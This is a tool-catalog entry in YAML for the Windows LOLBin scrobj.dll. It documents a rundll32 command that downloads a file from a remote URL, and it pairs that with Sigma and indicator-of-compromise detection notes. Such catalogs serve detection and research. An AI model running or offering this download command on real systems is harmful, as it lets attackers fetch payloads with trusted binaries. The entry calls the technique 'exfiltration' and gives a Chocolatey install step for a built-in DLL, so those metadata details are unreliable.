---
id: windows-download-scrobj
namespace: windows:download:scrobj
name: scrobj
description: 'Windows Script Component Runtime Located at: c:\windows\system32\scrobj.dll;
  c:\windows\syswow64\scrobj.dll.'
author: Eral4m
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- scrobj
parameters: []
features:
- network-intensive
- pipes-stdout
- process-manip
execution:
  template: scrobj
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Once executed, scrobj.dll attempts to load a file from the URL and
    saves it to INetCache. (Download file from remote location.)
  command: rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
references:
- label: '1479106975967240209'
  url: https://twitter.com/eral4m/status/1479106975967240209
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
- type: ioc
  description: Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler
    ('://') on the command line
install:
- method: choco
  package_name: scrobj
  commands:
  - choco install scrobj
---

# scrobj

scrobj is a Windows LOLBin. Windows Script Component Runtime Located at: c:\windows\system32\scrobj.dll; c:\windows\syswow64\scrobj.dll.
